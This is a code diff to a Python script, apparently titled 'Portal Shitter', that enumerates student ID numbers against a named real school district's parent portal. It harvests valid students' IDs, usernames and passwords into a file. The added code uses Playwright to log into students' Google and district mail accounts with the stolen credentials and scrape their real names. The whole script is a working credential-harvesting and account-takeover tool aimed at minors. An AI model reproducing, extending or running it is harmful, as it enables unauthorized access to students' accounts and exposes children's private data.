@@ -1,7 +1,14 @@
-from colored import fg, attr
+import time
 import mechanize
 from bs4 import BeautifulSoup
-import time
+from colored import fg, attr
+from playwright.sync_api import sync_playwright
+
+class settings():
+    getname = False
+    getschool = False
+    getcombo = False
+    getid = True # Forced, must never be disabled
 
 # Declare vars
 domain = "https://dashboard.okaloosaschools.com"
@@ -15,10 +22,21 @@ red = fg('#FF0000')
 orange = fg('#FFFF00')
 res = attr('reset')
 
+# Questions
+print("=== Portal Shitter ===\nA settings.config was not detected, please specify settings manually\n\nSettings =============")
+if input("Scrape name? ") == "y":
+    settings.getname = True
+if input("Save school? ") == "y":
+    settings.getschool = True
+if input("Save combo? ") == "y":
+    settings.getcombo = True
+if input("Save settings? ") == "y":
+    f = open("settings.config", "w")
+    f.write(f"getname = {str(settings.getname)}\ngetschool = {str(settings.getschool)}\ngetcombo{str(settings.getcombo)}")
+    f.close()
+
 # Set user class
 class user:
-    firstname = "N/A"
-    lastname = "N/A"
     studentid = "N/A"
     username = "N/A"
     password = "N/A"
@@ -47,11 +65,9 @@ for x in range(4624021143, 4699999999):
         br.select_form(nr=0)
     except mechanize._mechanize.FormNotFoundError:
         start = time.time()
-        print("[RUN] " + green
-              + "Found " + user.fullname + "..." + res)
         soup = BeautifulSoup(br.response().read(), 'lxml')
         redirect = str(soup)[63:146]
-        smurf.full= domain + redirect
+        smurf.full = domain + redirect
         br.open(smurf.full)
         soup = BeautifulSoup(br.response().read(), 'lxml')
 
@@ -66,18 +82,36 @@ for x in range(4624021143, 4699999999):
         finalSmurf = domain + "/parentportal/PP013.pgm?SmurfId= " + \
             smurf.id + "&wrkcycle=02&wrkgrd=11&rcyear=2022"
 
+        # Get real name
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=False)
+            start = time.time()
+            page = browser.new_page()
+            page.goto("https://mail.google.com")
+            print("Google login")
+            html = page.inner_html("#content")
+            soup = BeautifulSoup(html, "html.parser")
+            print(soup)
+            page.fill('xpath=//*[@id="identifierId"]', f"{user.username.lower()}@student.okaloosaschools.com")
+            print("Google done")
+            page.click('xpath=//*[@id="identifierNext"]/div/button/div[3]')
+            page.fill('xpath=//*[@id="userNameInput"]', user.username)
+            page.fill('//*[@id="passwordInput"]', user.password)
+            page.click('xpath=//*[@id="submitButton"]')
+            user.fullname = page.inner_html('xpath=/html/body/div[3]/div/div[2]')
+
         # Write to file
         f = open("./assets/matches.txt", "a")
-        f.write("Student ID: " + user.studentid + "\nUsername: "
-                + user.username + "\nPassword: " + user.password + "\n\n")
+        f.write(f"Name: {user.fullname}\nID: {user.studentid}\nUsername: {user.username}\nPassword: {user.password}")
         f.close()
 
         # Time
         end = time.time()
         delta = str(round(end - start, 2))
+        print("[RUN] " + green + "Found " + user.fullname + "..." + res)
         print(" L " + green + "Scraped " + user.studentid + "..." + res)
         print(" L " + green + "Scraped " + user.username + "..." + res)
         print(" L " + green + "Scraped " + user.password + "..." + res)
         print(" L " + green + "Scraped " + smurf.id + "..." + res)
         print(" L " + orange + "Took " + delta + "s to process match..." + res)
-        pass
+        break
